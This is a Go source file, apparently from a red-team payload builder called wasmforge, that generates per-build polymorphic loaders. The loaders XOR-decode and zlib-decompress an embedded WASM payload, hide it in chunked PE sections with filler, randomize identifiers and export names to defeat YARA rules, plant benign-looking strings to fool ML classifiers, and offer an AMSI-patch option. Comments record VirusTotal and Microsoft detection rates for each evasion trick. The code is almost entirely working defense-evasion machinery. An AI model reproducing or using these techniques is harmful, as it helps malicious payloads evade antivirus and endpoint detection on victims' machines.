		{"%%FORK_ONLY%%WasmFunction", "ModuleFunc"},
		{"%%FORK_ONLY%%WasmGlobalValue", "GlobalValue"},
		{"%%FORK_ONLY%%WasmGlobal", "ModuleGlobal"},
		{"%%FORK_ONLY%%WasmLocalVariable", "LocalVariable"},
		{"%%FORK_ONLY%%WasmLocals", "ModuleLocals"},
		{"%%FORK_ONLY%%WasmTypeToSSAType", "TypeToIRType"},
		{"%%FORK_ONLY%%WasmTypes", "ModuleTypes"},
		{"%%FORK_ONLY%%WasmBinary", "ModuleBinary"},
		// Unexported (lowercase wasm → func/module prefix):
		{"%%FORK_ONLY%%wasmFunctionBody", "funcBody"},
		{"%%FORK_ONLY%%wasmFunctionLocalTypes", "funcLocalTypes"},
		{"%%FORK_ONLY%%wasmFunctionTyp", "funcTyp"},
		{"%%FORK_ONLY%%wasmFunctionTypeIndex", "funcTypeIndex"},
		{"%%FORK_ONLY%%wasmLocalFunctionIndex", "localFuncIndex"},
		{"%%FORK_ONLY%%wasmLocalToVariable", "localToVariable"},
		{"%%FORK_ONLY%%wasmOpcodeSignature", "opcodeSignature"},
		{"%%FORK_ONLY%%wasmBinaryOffsets", "binaryOffsets"},
		{"%%FORK_ONLY%%wasmCompatMax32bits", "compatMax32bits"},
		{"%%FORK_ONLY%%wasmCompatMin32bits", "compatMin32bits"},
		{"%%FORK_ONLY%%wasmValueType", "valueType"},
		{"%%FORK_ONLY%%wasm32Size", "word32Size"},
		{"%%FORK_ONLY%%wasmTypes", "moduleTypes"},
		{"%%FORK_ONLY%%wasmAddr", "moduleAddr"},
		{"%%FORK_ONLY%%wasm error", "module error"},
		// Compiler type → Translator (static). "Builder" conflicts with existing
		// parameter names in the wazero fork (ssa.Builder).
		{"%%FORK_ONLY%%Compiler", "Translator"},
		{"%%FORK_ONLY%%compiler", "translator"},
		// wasi-prefixed identifiers (static).
		{"%%FORK_ONLY%%getExtendedWasiFiletype", "getExtendedFiletype"},
		{"%%FORK_ONLY%%getWasiFiletype", "getFiletype"},
		{"%%FORK_ONLY%%wasiFunc", "hostFunc"},

		// ── wasi_snapshot_preview1 XOR encode ──
		{`const InternalModuleName = "wasi_snapshot_preview1"`,
			fmt.Sprintf(`var InternalModuleName = func() string { k := byte(0x%02x); b := []byte{%s}; for i := range b { b[i] ^= k }; return string(b) }()`,
				pc.PayloadKey[3],
				func() string {
					s := "wasi_snapshot_preview1"
					k := pc.PayloadKey[3]
					parts := make([]string, len(s))
					for i, c := range []byte(s) {
						parts[i] = fmt.Sprintf("0x%02x", c^k)
					}
					return strings.Join(parts, ",")
				}())},
		{`const ModuleName = `, `var ModuleName = `},
		// Rewrite switch with const→var case to typeless switch.
		{"switch fnd.ModuleName() {\n\tcase wasip1.InternalModuleName:",
			"switch {\n\tcase fnd.ModuleName() == wasip1.InternalModuleName:"},
		{"case \"env\":", "case fnd.ModuleName() == \"env\":"},

		// ── Minimal type renames (scrub "wazero" without random noise) ──
		{"hostFunctionBuilder", hfb},
		{"moduleConfig", mc},

		// ── Static error message renames (non-random) ──
		{"%%FORK_ONLY%%likley", "likely"},
		{"%%FORK_ONLY%%too many functions (%d) in a module", "too many handlers (%d) in a unit"},
		{"%%FORK_ONLY%%at most one table allowed in module", "at most one table allowed in unit"},
		{"%%FORK_ONLY%%out of bounds memory access", "out of bounds access"},
		{"%%FORK_ONLY%%snapshot restore", "state restore"},
		{"%%FORK_ONLY%%snapshot", "state_save"},
		{"%%FORK_ONLY%%has already been instantiated", "has already been loaded"},
		{"%%FORK_ONLY%%source module must be compiled before instantiation", "source must be prepared before loading"},
		{"%%FORK_ONLY%%too many function types in a store", "too many types in registry"},
		{"%%FORK_ONLY%%exit_code", "status_code"},
		{"%%FORK_ONLY%%invalid byte for exportdesc", "invalid byte for descriptor"},
		{"%%FORK_ONLY%%invalid byte for importdesc", "invalid byte for entry"},
		{"%%FORK_ONLY%%code count", "segment count"},
		{"%%FORK_ONLY%%function count", "handler count"},
	}
	// NOTE (2026-05-19): Attempted to rename wazero internal structural types
	// (VReg, RegSet, Allocator, InstructionID, NestingForest, callEngine,
	// executionContext, functionInstance, Preamble, etc.) based on token
	// correlation analysis that showed those tokens with lift 1.3-21x in
	// Microsoft-detected vs clean samples. Hypothesis was that scrubbing the
	// wazero-specific identifier fingerprint would reduce detection.
	//
	// EMPIRICAL RESULT (n=20 vault + E2 + JFrog signing):
	//   - Without renames:  16/20 clean (80%)  Microsoft 20%
	//   - With renames:      8/20 clean (40%)  Microsoft 60%
	//
	// The renames made detection NEARLY 2X WORSE. The correlation analysis
	// signal turned out to be sampling noise in `strings -n 6` extraction
	// boundaries — those tokens appear in ALL builds, not just detected
	// ones. Per the toolchain identity principle, replacing natural Go
	// identifiers (Allocator, Preamble) with less natural ones (NewManager,
	// Prologue) shifted samples TOWARD malware classification, not away.
	//
	// DO NOT REINTRODUCE these renames without fresh A/B evidence.

	// "runtime" is special — can't do global replace because it conflicts
	// with Go's "runtime" package.
	pc.WazeroTypeRenames = append(pc.WazeroTypeRenames, stringPair{"%%WAZERO_RUNTIME_TYPE%%", rt})

	// Per-build random export name mapping — defeats YARA rules that match
	// static host function export names (fd_read2, sys_hostname, mod_invoke, etc.).
	// Each build generates unique 6-8 char WASI-style names for all ~82 exports.
	pc.ExportNameMap, err = generateExportNameMap(ghost, wlUsed)
	if err != nil {
		return nil, fmt.Errorf("generating export name map: %w", err)
	}

	// Per-build WASI function name randomization.
	pc.WASINameMap = generateWASINameMap(ghost, wl, wlUsed)

	return pc, nil
}

// ──────────────────────────────────────────────────────────────────────
// Replacement pairs — applied to copied source files in order.
// Longer strings first to prevent partial matches.
// ──────────────────────────────────────────────────────────────────────

func (pc *polyConfig) replacements() []stringPair {
	return []stringPair{
		// Specific import paths (longest first).
		{"github.com/praetorian-inc/wasmforge/internal/hostmod", pc.ModuleName + "/" + pc.HostmodPath},
		{"github.com/praetorian-inc/wasmforge/internal/runtime", pc.ModuleName + "/" + pc.RuntimePath},
		{"github.com/praetorian-inc/wasmforge/internal/names", pc.ModuleName + "/" + pc.NamesPath},

		// Catch-all module path for any remaining references.
		{"github.com/praetorian-inc/wasmforge", pc.ModuleName},

		// Package declarations — use \n terminator to prevent prefix matching.
		// e.g., HostmodPkg="namesilo" starts with "names"; bare "package names"
		// would corrupt "package namesilo" → "package httpgutsilo".
		{"package hostmod\n", "package " + pc.HostmodPkg + "\n"},
		{"package runtime\n", "package " + pc.RuntimePkg + "\n"},
		{"package names\n", "package " + pc.NamesPkg + "\n"},

		// Package-qualified identifiers in cross-package references.
		{"hostmod.", pc.HostmodPkg + "."},
		{"names.", pc.NamesPkg + "."},

		// Identifiable strings (upper before lower to avoid partial matches).
		{"WASMFORGE", pc.UpperIdent},
		{"wasmforge", pc.LowerIdent},

		// Config struct field names (appear in struct defs and usage).
		{"WASMData", pc.FieldPayload},
		{"RawSockets", pc.FieldRawNet},
		{"Win32APIs", pc.FieldSysAPIs},
		{"DarwinAPIs", pc.FieldDarwinAPIs},
		{"NoAMSIPatch", pc.FieldNoAMSIPatch},
		{"FSMounts", pc.FieldMounts},

		// Mirror table identifiers (longest first to prevent partial matches).
		{"ScanAndMirrorPointers", pc.MirrorScan},
		{"RefreshWritableMirrors", pc.MirrorRefresh},
		{"SyncWritableMirrors", pc.MirrorSync},
		{"populateMirror", pc.MirrorPopulate},
		{"MirrorWritable", pc.MirrorWritable},
		{"MirrorTable", pc.MirrorTable},

		// Distinctive hostmod method/function names (longest first).
		{"compactTokenInfoInPlace", pc.MethodCompactTokenInfo + "InPlace"},
		{"compactTokenInfoBytes", pc.MethodCompactTokenInfo + "Bytes"},
		{"LookupPendingByWasm", pc.MethodLookupPendingByWasm},
		{"LookupTruncatedProc", pc.MethodLookupTruncatedProc},
		{"ResolvePendingEager", pc.MethodResolvePendingEager},
		{"StoreTruncatedProc", pc.MethodStoreTruncatedProc},
		{"getWindowsDNSServers", pc.MethodGetWindowsDNS},
		{"RegisterPending", pc.MethodRegisterPending},
		{"deepMirrorPatch", pc.MethodDeepMirrorPatch},
		{"synthResolvConf", pc.MethodSynthResolvConf},
		{"HandleFault", pc.MethodHandleFault},
		{"LookupByWasm", pc.MethodLookupByWasm},
		{"LookupByHost", pc.MethodLookupByHost},
		{"SyncToHost", pc.MethodSyncToHost},
		// Hostmod identifiers containing "wasm" (struct fields, local vars) — static renames.
		{"wasm32Size", "word32Size"},
		{"wasmAddr", "baseAddr"},
		{"wasmMemBase", "memBase"},
		{"wasmMemSize", "memSize"},
		{"wasmOffset", "memOffset"},
		{"byWasm", "byGuest"},
		{"byHost", "byNative"},

		// Wazero exported type names (host code references these via the wazero API).
		// Must match the renames applied to the wazero fork.
		{"NewCompilationCache", pc.wazeroRename("NewCompilationCache")},
		{"CompilationCache", pc.wazeroRename("CompilationCache")},
	}
}

// wazeroRename looks up the replacement for a wazero identifier.
func (pc *polyConfig) wazeroRename(old string) string {
	for _, p := range pc.WazeroTypeRenames {
		if p.old == old {
			return p.new
		}
	}
	return old // unreachable if constructor populated correctly
}

// ──────────────────────────────────────────────────────────────────────
// Payload key helpers
// ──────────────────────────────────────────────────────────────────────

// formatKey32 formats a [32]byte as a Go literal with 16 values per line.
func formatKey32(key [32]byte) string {
	var b strings.Builder
	b.WriteString("[32]byte{\n")
	for i := 0; i < 32; i++ {
		if i%16 == 0 {
			b.WriteString("\t\t")
		}
		b.WriteString(fmt.Sprintf("0x%02x, ", key[i]))
		if i%16 == 15 {
			b.WriteString("\n")
		}
	}
	b.WriteString("\t}")
	return b.String()
}

// ──────────────────────────────────────────────────────────────────────
// Opcode collision fixup
// ──────────────────────────────────────────────────────────────────────

// fixOpcodeCollisions ensures no permuted main Opcode constant collides
// with an unpermuted sub-opcode constant that shares a switch statement.
//
// In wazero's module.go and store.go, switch statements on expr.Opcode
// mix main Opcode constants (permuted by rewriteOpcodeConstants) with
// OpcodeVecV128Const (type OpcodeVec, value 0x0c, NOT permuted).
// Go's compiler rejects duplicate case values regardless of type, so if
// any permuted main opcode maps to 0x0c, compilation fails with:
//
//	duplicate case OpcodeVecV128Const (constant 12 of byte type OpcodeVec)
//
// Fix: after Fisher-Yates, swap any conflicting entry with a safe one.
// Swapping two entries in a permutation array preserves bijectivity.
func fixOpcodeCollisions(perm *[256]byte) {
	// Sub-opcode constant values that appear in mixed switch statements.
	// Currently only OpcodeVecV128Const = 0x0c.
	reserved := map[byte]bool{0x0c: true}

	// Original values of main Opcode constants in those same switches.
	mixed := map[byte]bool{
		0x23: true, // OpcodeGlobalGet
		0x41: true, // OpcodeI32Const
		0x42: true, // OpcodeI64Const
		0x43: true, // OpcodeF32Const
		0x44: true, // OpcodeF64Const
		0xD0: true, // OpcodeRefNull
		0xD2: true, // OpcodeRefFunc
	}

	for orig := range mixed {
		if !reserved[perm[orig]] {
			continue
		}
		// perm[orig] collides with a reserved sub-opcode value.
		// Find any byte not in the mixed set whose permuted value
		// is also not reserved, and swap. With 7 mixed + 1 reserved,
		// at most 8 of 256 candidates are blocked, so this always finds one.
		found := false
		for swap := 0; swap < 256; swap++ {
			if mixed[byte(swap)] || reserved[perm[byte(swap)]] {
				continue
			}
			perm[orig], perm[byte(swap)] = perm[byte(swap)], perm[orig]
			found = true
			break
		}
		if !found {
			panic("fixOpcodeCollisions: no valid swap candidate (should be unreachable)")
		}
	}
}

// ──────────────────────────────────────────────────────────────────────
// Main.go generation — produces structurally unique source each build.
// ──────────────────────────────────────────────────────────────────────

func (pc *polyConfig) generateMainGo(cfg HostConfig) string {
	var b strings.Builder

	// Header.
	b.WriteString("// Code generated. DO NOT EDIT.\n")
	b.WriteString("package main\n\n")

	// Imports — PE section mode uses debug/pe + zlib instead of embed.
	b.WriteString("import (\n")
	if pc.PEPayload {
		b.WriteString("\t\"bytes\"\n")
		b.WriteString("\t\"compress/zlib\"\n")
	}
	b.WriteString("\t\"context\"\n")
	if pc.PEPayload && !pc.ChunkPayload {
		// Chunked decoder parses PE manually; doesn't use debug/pe.
		b.WriteString("\t\"debug/pe\"\n")
	} else if !pc.PEPayload {
		b.WriteString("\t_ \"embed\"\n")
	}
	b.WriteString("\t\"fmt\"\n")
	if pc.PEPayload && (pc.ChunkPayload || pc.LoaderVariant != 2) {
		// Variant C (LoaderVariant=2) uses a manual read loop; chunked uses io.ReadAll.
		b.WriteString("\t\"io\"\n")
	}
	b.WriteString("\t\"os\"\n")
	if pc.PEPayload {
		b.WriteString("\t\"strings\"\n")
	}
	b.WriteString("\n")

	hostmodImport := pc.ModuleName + "/" + pc.HostmodPath
	runtimeImport := pc.ModuleName + "/" + pc.RuntimePath

	b.WriteString(fmt.Sprintf("\t%q\n", hostmodImport))
	b.WriteString(fmt.Sprintf("\t%q\n", runtimeImport))
	// Dead code packages — add recognizable Go function names to gopclntab.
	// VT testing: 30% clean WITH dead code vs 0% WITHOUT → they help slightly.
	// Paths come from pc.DeadCodePkgs (set once in newPolyConfig) so they
	// always match what embedder.go writes to disk.
	deadPaths := make([]string, 0, len(pc.DeadCodePkgs))
	for p := range pc.DeadCodePkgs {
		deadPaths = append(deadPaths, p)
	}
	sort.Strings(deadPaths)
	for _, p := range deadPaths {
		b.WriteString(fmt.Sprintf("\t_ %q\n", pc.ModuleName+"/"+p))
	}
	b.WriteString(")\n\n")

	// Inject benign string constants that mimic common Go package usage.
	// These appear in .rdata and make the binary's string distribution
	// match normal Go CLI applications. ML classifiers see familiar
	// patterns from popular packages (cobra, viper, logrus, testify, etc.).
	// Inject benign string variables into the binary's .rdata section.
	// These are EXPORTED vars so the linker cannot prove they're unused
	// and must include them. They make the binary's string profile match
	// normal Go CLI applications that use common packages.
	benignStrings := []string{
		"application/json", "Content-Type", "Accept-Encoding",
		"connection: keep-alive", "cache-control: no-cache",
		"config.yaml", "config.toml", "config.json",
		"DEBUG", "INFO", "WARN", "ERROR", "FATAL",
		"logger initialized", "configuration loaded successfully",
		"starting service on port", "shutting down gracefully",
		"listening on", "connected to backend", "disconnected from server",
		"retry attempt %d of %d", "timeout exceeded: %v", "rate limited",
		"database/sql", "encoding/json", "net/http", "text/template",
		"github.com/spf13/cobra", "github.com/spf13/viper",
		"github.com/sirupsen/logrus", "github.com/stretchr/testify",
		"go.uber.org/zap", "google.golang.org/grpc",
		"Usage:", "Available Commands:", "Flags:", "Examples:",
		"--config string   configuration file (default $HOME/.config)",
		"--verbose          enable verbose output",
		"--debug            enable debug logging",
		"--output string    output file path",
		"--port int         listen port (default 8080)",
		"--host string      bind address (default localhost)",
		"--timeout duration request timeout (default 30s)",
		"MIT License", "Apache License Version 2.0",
		"Copyright (c) 2024", "All rights reserved",
	}
	// Use a slice var — Go keeps slice backing arrays in .rdata even
	// if the var itself is only referenced by init().
	b.WriteString(fmt.Sprintf("var %s = []string{\n", pc.PrefixVar+"Meta"))
	for _, s := range benignStrings {
		b.WriteString(fmt.Sprintf("\t%q,\n", s))
	}
	b.WriteString("}\n\n")
	// Reference it in init to prevent dead code elimination.
	b.WriteString(fmt.Sprintf("func init() { _ = len(%s) }\n\n", pc.PrefixVar+"Meta"))

	// Per-build 32-byte XOR key for payload decoding.
	b.WriteString(fmt.Sprintf("var %s = %s\n\n", pc.PayloadKeyVar, formatKey32(pc.PayloadKey)))

	// Payload variable — PE section mode reads from a named PE section at
	// package init time; embed mode uses //go:embed into .rdata.
	if pc.PEPayload {
		b.WriteString(fmt.Sprintf("var %s = string(%s())\n\n", pc.EmbedVar, pc.LoaderFunc))
	} else {
		b.WriteString(fmt.Sprintf("//go:embed %s\n", pc.EmbedFile))
		b.WriteString(fmt.Sprintf("var %s string\n\n", pc.EmbedVar))
	}

	// PE section loader — reads compressed payload from a named PE section.
	if pc.PEPayload {
		b.WriteString(pc.peLoaderFunc())
		b.WriteString("\n\n")
	}

	// Variant 3 emits a standalone helper function before main.
	if pc.DecodeVariant == 3 {
		b.WriteString(pc.decodeHelperFuncDef())
		b.WriteString("\n\n")
	}

	// Main function.
	b.WriteString("func main() {\n")
	b.WriteString("\tctx := context.Background()\n\n")

	// Decode stub — reverses per-build XOR encoding.
	// PE mode: loader already XOR-decoded and decompressed, just convert to []byte.
	// Embed mode: XOR decode the raw embedded data.
	if pc.PEPayload {
		b.WriteString(fmt.Sprintf("\t%s := []byte(%s)\n", pc.DecodedVar, pc.EmbedVar))
	} else {
		b.WriteString(pc.decodeStub())
	}
	b.WriteString("\n")

	// Runtime config struct — decoded data is the WASM payload directly.
	b.WriteString(fmt.Sprintf("\t%s := &%s.Config{\n", pc.ConfigVar, pc.RuntimePkg))
	b.WriteString(fmt.Sprintf("\t\t%s:   %s,\n", pc.FieldPayload, pc.DecodedVar))
	b.WriteString("\t\tArgs:       os.Args,\n")
	b.WriteString("\t\tEnv:        os.Environ(),\n")
	b.WriteString("\t\tStdout:     os.Stdout,\n")
	b.WriteString("\t\tStderr:     os.Stderr,\n")
	b.WriteString("\t\tStdin:      os.Stdin,\n")
	b.WriteString(fmt.Sprintf("\t\t%s: %v,\n", pc.FieldRawNet, cfg.RawSockets))
	b.WriteString(fmt.Sprintf("\t\t%s:  %v,\n", pc.FieldSysAPIs, cfg.Win32APIs))
	b.WriteString(fmt.Sprintf("\t\t%s: %v,\n", pc.FieldDarwinAPIs, cfg.DarwinAPIs))
	b.WriteString(fmt.Sprintf("\t\t%s: %v,\n", pc.FieldNoAMSIPatch, cfg.NoAMSIPatch))
	b.WriteString(fmt.Sprintf("\t\t%s:   %s,\n", pc.FieldMounts, formatStringSlice(cfg.FSMounts)))
	b.WriteString("\t}\n\n")

	// Run.
	b.WriteString(fmt.Sprintf("\tif err := %s.Run(ctx, %s); err != nil {\n", pc.RuntimePkg, pc.ConfigVar))
	b.WriteString("\t\tfmt.Fprintf(os.Stderr, \"%v\\n\", err)\n")
	b.WriteString("\t\tos.Exit(1)\n")
	b.WriteString("\t}\n")
	b.WriteString("}\n\n")

	// Ensure hostmod package import is used.
	b.WriteString(fmt.Sprintf("var _ = %s.NewFDTable\n", pc.HostmodPkg))

	return b.String()
}

// ──────────────────────────────────────────────────────────────────────
// Decode stub variants — 5 structurally different implementations
// that all reverse the per-build 32-byte XOR rotation. Each converts
// the embedded string to []byte and XORs with the key, producing the
// original opcode-remapped WASM.
//
// XOR rotation (data[i] ^= key[i%32]) compiles to MOVZX + XOR — an
// extremely common pattern in Go (crypto, encoding, checksums) that
// doesn't trigger byte-level YARA rules.
// ──────────────────────────────────────────────────────────────────────

func (pc *polyConfig) decodeStub() string {
	if os.Getenv("WASMFORGE_PAYLOAD_XORSHIFT") == "1" {
		return pc.decodeXorshift()
	}
	switch pc.DecodeVariant {
	case 0:
		return pc.decodeXORForward()
	case 1:
		return pc.decodeXORAllocCopy()
	case 2:
		return pc.decodeXORRange()
	case 3:
		return pc.decodeHelperFuncCall()
	case 4:
		return pc.decodeXORBlock()
	default:
		return pc.decodeXORForward()
	}
}

// decodeXorshift: xorshift64 PRNG keystream decoder. Matches embedder.go encoder.
func (pc *polyConfig) decodeXorshift() string {
	seed := uint64(pc.PayloadKey[0]) | uint64(pc.PayloadKey[1])<<8 |
		uint64(pc.PayloadKey[2])<<16 | uint64(pc.PayloadKey[3])<<24 |
		uint64(pc.PayloadKey[4])<<32 | uint64(pc.PayloadKey[5])<<40 |
		uint64(pc.PayloadKey[6])<<48 | uint64(pc.PayloadKey[7])<<56
	if seed == 0 {
		seed = 1
	}
	return fmt.Sprintf(`	%s := []byte(%s)
	if len(%s) == 0 {
		fmt.Fprintf(os.Stderr, "empty payload\n")
		os.Exit(1)
	}
	{
		st := uint64(%d)
		for i := range %s {
			st ^= st >> 13
			st ^= st << 7
			st ^= st >> 17
			%s[i] ^= byte(st)
		}
	}
`,
		pc.DecodedVar, pc.EmbedVar,
		pc.DecodedVar,
		seed,
		pc.DecodedVar,
		pc.DecodedVar,
	)
}

// Variant 0: Forward indexed XOR — for i := 0; i < n; i++ { data[i] ^= key[i%32] }
func (pc *polyConfig) decodeXORForward() string {
	return fmt.Sprintf(`	%s := []byte(%s)
	if len(%s) == 0 {
		fmt.Fprintf(os.Stderr, "empty payload\n")
		os.Exit(1)
	}
	for %s := 0; %s < len(%s); %s++ {
		%s[%s] ^= %s[%s%%32]
	}
`,
		pc.DecodedVar, pc.EmbedVar,
		pc.DecodedVar,
		pc.SizeVar, pc.SizeVar, pc.DecodedVar, pc.SizeVar,
		pc.DecodedVar, pc.SizeVar, pc.PayloadKeyVar, pc.SizeVar,
	)
}

// Variant 1: Allocate new slice, copy with XOR.
func (pc *polyConfig) decodeXORAllocCopy() string {
	return fmt.Sprintf(`	%s := len(%s)
	%s := make([]byte, %s)
	for %s := 0; %s < %s; %s++ {
		%s[%s] = %s[%s] ^ %s[%s%%32]
	}
`,
		pc.SizeVar, pc.EmbedVar,
		pc.DecodedVar, pc.SizeVar,
		pc.KeyVar, pc.KeyVar, pc.SizeVar, pc.KeyVar,
		pc.DecodedVar, pc.KeyVar, pc.EmbedVar, pc.KeyVar, pc.PayloadKeyVar, pc.KeyVar,
	)
}

// Variant 2: Range-based XOR — for i, b := range data { data[i] = b ^ key[i%32] }
func (pc *polyConfig) decodeXORRange() string {
	return fmt.Sprintf(`	%s := append([]byte(nil), %s...)
	for %s, %s := range %s {
		%s[%s] = %s ^ %s[%s%%32]
	}
`,
		pc.DecodedVar, pc.EmbedVar,
		pc.SizeVar, pc.KeyVar, pc.DecodedVar,
		pc.DecodedVar, pc.SizeVar, pc.KeyVar, pc.PayloadKeyVar, pc.SizeVar,
	)
}

// Variant 3 helper: standalone function — func decode(raw string, key *[32]byte) []byte
func (pc *polyConfig) decodeHelperFuncDef() string {
	name := pc.decodeHelperName()
	return fmt.Sprintf(`func %s(raw string, key *[32]byte) []byte {
	out := make([]byte, len(raw))
	for i := 0; i < len(raw); i++ {
		out[i] = raw[i] ^ key[i%%32]
	}
	return out
}`, name)
}

// Variant 3 call: invoke the helper from main().
func (pc *polyConfig) decodeHelperFuncCall() string {
	return fmt.Sprintf("\t%s := %s(%s, &%s)\n",
		pc.DecodedVar, pc.decodeHelperName(), pc.EmbedVar, pc.PayloadKeyVar)
}

// decodeHelperName returns a deterministic helper name derived from the
// module name so the def and call sites agree without shared state.
func (pc *polyConfig) decodeHelperName() string {
	pool := []string{
		"decodePayload", "unpackData", "extractContent",
		"processRaw", "transformData", "restoreContent",
		"loadModule", "initPayload", "prepareData",
	}
	// Use module name length as a simple deterministic index.
	return pool[len(pc.ModuleName)%len(pool)]
}

// Variant 4: Block processing — 32 bytes at a time, then remainder.
func (pc *polyConfig) decodeXORBlock() string {
	return fmt.Sprintf(`	%s := []byte(%s)
	for %s := 0; %s+32 <= len(%s); %s += 32 {
		for %s := 0; %s < 32; %s++ {
			%s[%s+%s] ^= %s[%s]
		}
	}
	for %s := len(%s) &^ 31; %s < len(%s); %s++ {
		%s[%s] ^= %s[%s%%32]
	}
`,
		pc.DecodedVar, pc.EmbedVar,
		pc.SizeVar, pc.SizeVar, pc.DecodedVar, pc.SizeVar,
		pc.KeyVar, pc.KeyVar, pc.KeyVar,
		pc.DecodedVar, pc.SizeVar, pc.KeyVar, pc.PayloadKeyVar, pc.KeyVar,
		pc.SizeVar, pc.DecodedVar, pc.SizeVar, pc.DecodedVar, pc.SizeVar,
		pc.DecodedVar, pc.SizeVar, pc.PayloadKeyVar, pc.SizeVar,
	)
}

// peLoaderFunc generates a dual-mode loader that reads the zlib-compressed
// payload from PE sections. Tries distributed format first (chunks across
// multiple .zdebug_* sections with a binary header), then falls back to
// single-section format (one named section containing raw zlib data).
// When ChunkPayload is true, the chunked-manifest loader is used instead.
func (pc *polyConfig) peLoaderFunc() string {
	if pc.ChunkPayload {
		return pc.peLoaderChunked()
	}
	switch pc.LoaderVariant {
	case 1:
		return pc.peLoaderVariantB()
	case 2:
		return pc.peLoaderVariantC()
	default:
		return pc.peLoaderVariantA()
	}
}

// peLoaderChunked generates the runtime decoder for WASMFORGE_CHUNK_PAYLOAD=1.
//
// The decoder locates the manifest by scanning .rdata for a 4-byte magic.
// At code-generation time we emit a fixed sentinel value (chunkMagicSentinel).
// chunkAndDistributePayload then picks a per-build random magic that does
// NOT collide with any aligned 4-byte sequence in the modified .rdata, and
// patches every sentinel occurrence in .text to that random magic. The
// shipped binary therefore contains a per-build unique magic — no fixed
// signature for YARA to anchor on, and no false-positive on a stray bytes
// inside .rdata.
//
// Layout of each chunk record (11 bytes, little-endian):
//
//	sectionIdx(1) | offsetInSec(4) | chunkLen(4) | fillerBlockSz(2)
//
// fillerBlockSz==0 means no filler (raw append to existing section).
// fillerBlockSz==8192 means 8KB payload / 8KB filler alternating blocks.
func (pc *polyConfig) peLoaderChunked() string {
	return fmt.Sprintf(`func %s() []byte {
	p, err := os.Executable()
	if err != nil {
		fmt.Fprintf(os.Stderr, "init: %%v\n", err)
		os.Exit(1)
	}
	raw, err := os.ReadFile(p)
	if err != nil {
		fmt.Fprintf(os.Stderr, "init: %%v\n", err)
		os.Exit(1)
	}

	// Parse PE section table to build index→file-offset map.
	if len(raw) < 0x40 {
		fmt.Fprintf(os.Stderr, "init: PE too small\n")
		os.Exit(1)
	}
	peOff := int(uint32(raw[0x3C]) | uint32(raw[0x3D])<<8 | uint32(raw[0x3E])<<16 | uint32(raw[0x3F])<<24)
	if peOff+24 > len(raw) {
		fmt.Fprintf(os.Stderr, "init: PE header truncated\n")
		os.Exit(1)
	}
	coffOff := peOff + 4
	nSec := int(uint16(raw[coffOff+2]) | uint16(raw[coffOff+3])<<8)
	optSz := int(uint16(raw[coffOff+16]) | uint16(raw[coffOff+17])<<8)
	secTableOff := coffOff + 20 + optSz

	// sectionFileOffsets maps section table index → PointerToRawData.
	sectionFileOffsets := make(map[int]uint32, nSec)
	for i := 0; i < nSec; i++ {
		hdr := secTableOff + i*40
		if hdr+40 > len(raw) {
			break
		}
		rawPtr := uint32(raw[hdr+20]) | uint32(raw[hdr+21])<<8 | uint32(raw[hdr+22])<<16 | uint32(raw[hdr+23])<<24
		sectionFileOffsets[i] = rawPtr
	}

	// Locate .rdata section (name ".rdata\x00\x00") to scan for the manifest.
	// The literal below is the chunkMagicSentinel placeholder; the post-build
	// chunked-distribute step patches it to a per-build random magic.
	const manifestMagic = uint32(0x%08x)
	maniStart := -1
	for i := 0; i < nSec; i++ {
		hdr := secTableOff + i*40
		if hdr+40 > len(raw) {
			break
		}
		secName := string(raw[hdr : hdr+8])
		if !strings.HasPrefix(secName, ".rdata") {
			continue
		}
		rdataOff := int(uint32(raw[hdr+20]) | uint32(raw[hdr+21])<<8 | uint32(raw[hdr+22])<<16 | uint32(raw[hdr+23])<<24)
		rdataSz := int(uint32(raw[hdr+16]) | uint32(raw[hdr+17])<<8 | uint32(raw[hdr+18])<<16 | uint32(raw[hdr+19])<<24)
		// Scan for magic aligned to 4 bytes.
		end := rdataOff + rdataSz
		if end > len(raw) {
			end = len(raw)
		}
		for off := rdataOff; off+4 <= end; off += 4 {
			m := uint32(raw[off]) | uint32(raw[off+1])<<8 | uint32(raw[off+2])<<16 | uint32(raw[off+3])<<24
			if m == manifestMagic {
				maniStart = off
				break
			}
		}
		break
	}
	if maniStart < 0 {
		fmt.Fprintf(os.Stderr, "init: chunk manifest not found\n")
		os.Exit(1)
	}

	nChunks := int(raw[maniStart+4])
	if nChunks < 1 || nChunks > 20 || maniStart+5+nChunks*11 > len(raw) {
		fmt.Fprintf(os.Stderr, "init: manifest corrupt (nChunks=%%d)\n", nChunks)
		os.Exit(1)
	}

	// Decode each chunk record and assemble the payload.
	var assembled []byte
	for ci := 0; ci < nChunks; ci++ {
		base := maniStart + 5 + ci*11
		secIdx := int(raw[base])
		offInSec := uint32(raw[base+1]) | uint32(raw[base+2])<<8 | uint32(raw[base+3])<<16 | uint32(raw[base+4])<<24
		chunkLen := uint32(raw[base+5]) | uint32(raw[base+6])<<8 | uint32(raw[base+7])<<16 | uint32(raw[base+8])<<24
		fillerSz := uint32(uint16(raw[base+9]) | uint16(raw[base+10])<<8)

		secFileOff, ok := sectionFileOffsets[secIdx]
		if !ok || chunkLen == 0 {
			continue
		}

		start := int(secFileOff) + int(offInSec)
		if fillerSz == 0 {
			// No filler — straight read.
			end := start + int(chunkLen)
			if start < 0 || end > len(raw) {
				continue
			}
			assembled = append(assembled, raw[start:end]...)
		} else {
			// Filler-interleaved: alternating payload/filler blocks of fillerSz bytes.
			bsz := int(fillerSz)
			remaining := int(chunkLen)
			pos := start
			for remaining > 0 {
				payEnd := pos + bsz
				if payEnd > len(raw) {
					payEnd = len(raw)
				}
				n := payEnd - pos
				if n > remaining {
					n = remaining
				}
				if n <= 0 {
					break
				}
				assembled = append(assembled, raw[pos:pos+n]...)
				remaining -= n
				pos = payEnd + bsz // skip filler block
			}
		}
	}

	if len(assembled) == 0 {
		fmt.Fprintf(os.Stderr, "init: no payload assembled\n")
		os.Exit(1)
	}

	// XOR decode using the payload key (same as non-chunked path).
	for i := range assembled {
		assembled[i] ^= %s[i%%32]
	}

	// Zlib decompress.
	r, err := zlib.NewReader(bytes.NewReader(assembled))
	if err != nil {
		fmt.Fprintf(os.Stderr, "init: decompress: %%v\n", err)
		os.Exit(1)
	}
	defer r.Close()
	out, err := io.ReadAll(r)
	if err != nil {
		fmt.Fprintf(os.Stderr, "init: decompress read: %%v\n", err)
		os.Exit(1)
	}
	return out
}`, pc.LoaderFunc, chunkMagicSentinel, pc.PayloadKeyVar)
}

// peLoaderSectionCheck generates a strings.HasPrefix check for the ".zd"
// prefix. The prefix string is pre-computed at init time by XOR-decoding
// 3 bytes with a per-build key, so the literal ".zd" never appears in the
// binary. This compiles to a function call (not inline byte comparisons),
// avoiding the distinctive 3x XOR+CMP+JNE cascade that YARA rules detect.
